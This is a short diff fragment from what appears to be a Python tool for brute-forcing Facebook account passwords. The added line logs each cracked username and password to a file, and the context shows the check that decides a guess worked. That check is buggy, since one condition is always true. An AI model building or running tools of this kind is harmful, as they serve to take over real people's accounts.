@@ -445,7 +445,7 @@ def main():
                     break
                   if  'Find friends' in page_content or 'authentication' in page_content or 'recovery information':
                     print(f'{yellow} {check_password} is the correct password{plain}')
-                    
+                    save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
                   else:
                     logging.critical(sel_timer)
                     print(f'{red}Await response timeout{plain}')
